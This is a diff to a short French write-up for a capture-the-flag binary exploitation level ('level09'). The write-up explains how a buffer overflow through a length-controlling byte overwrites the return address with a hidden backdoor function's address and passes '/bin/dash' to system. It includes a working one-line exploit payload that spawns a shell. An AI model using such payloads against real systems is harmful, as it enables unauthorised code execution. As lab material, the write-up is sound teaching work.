@@ -1,4 +1,8 @@
-(python -c "print('A'*40+'\xff')"; python -c "print('A'*200+'\x8c\x48\x55\x55\x55\x55\x00\x00')"; python -c "print('/bin/dash')"; cat) | ./level09
-
 On remarque qu'on peut changer la taille du strncpy avec le 41eme caractere du premier input.
-On trouve l'offset pour reecrire rip (Ne pas oublier le dernier input pour ne pas segfault)
+On overflow le buffer, on trouve l'offset pour reecrire rip a l'aide d'un pattern.
+On reecrit l'addresse qui segfault par celle de la fonction secret backdoor.
+Enfin on envoie un "/bin/dash" en argument du call system
+
+(Ne pas oublier le dernier input pour ne pas segfault)
+
+(python -c "print('A'*40+'\xff')"; python -c "print('A'*200+'\x8c\x48\x55\x55\x55\x55\x00\x00')"; python -c "print('/bin/dash')"; cat) | ./level09
